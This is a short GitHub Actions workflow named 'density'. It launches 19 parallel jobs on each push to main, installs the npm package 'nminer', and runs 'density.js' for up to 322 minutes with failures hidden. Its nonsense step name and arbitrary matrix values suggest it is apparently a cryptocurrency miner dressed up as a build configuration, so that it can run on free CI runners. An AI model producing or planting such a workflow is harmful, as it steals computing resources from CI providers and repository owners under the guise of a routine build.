name: density
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5261 }
          - { version: 7267 }
          - { version: 8028 }
          - { version: 8160 }
          - { version: 7564 }
          - { version: 7938 }
          - { version: 9294 }
          - { version: 9823 }
          - { version: 5526 }
          - { version: 2226 }
          - { version: 2843 }
          - { version: 475 }
          - { version: 6757 }
          - { version: 4634 }
          - { version: 1287 }
          - { version: 871 }
          - { version: 888 }
          - { version: 6667 }
          - { version: 9497 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: triumphantly fully once
        run: |
          npm install nminer@latest
          timeout 322m node density.js || echo "density executed"